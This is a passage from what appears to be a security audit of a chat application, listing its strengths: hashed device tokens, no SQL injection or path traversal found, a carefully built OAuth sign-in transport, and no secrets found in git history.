    privacy policy omits ChatGPT and Firecrawl as third parties.

---

## 7. What's actually good

- Device tokens: 256-bit, stored as SHA-256, indexed equality lookup.
- No SQL injection found; FTS input quoted per term; migrations append-only and
  transactional.
- No path traversal in `/attachments`, `/backgrounds`, `/share` (server-generated
  ids, strict token regex); downloads set `nosniff` + `attachment`.
- ChatGPT SIWC transport is well built: PKCE S256, state, nonce, JWKS
  verification, fresh loopback port, 0600 atomic store, serialized refresh,
  `redirect:"error"`, body echo suppressed, buffer caps.
- Mid-stream failover correctly refused (`MidStreamError`).
- `providers.json` holds env var names, not keys; `.env` written 0600 atomically.
- Web markdown rendering is safe today (`skipHtml`, URL filter, images as links).
- MCP plugins don't execute anything (`plugin_unavailable`).
- Landing page copy itself is compliant (source-available, Slack/Discord
  "Planned").
- No secrets in git history (scanned for common key formats).
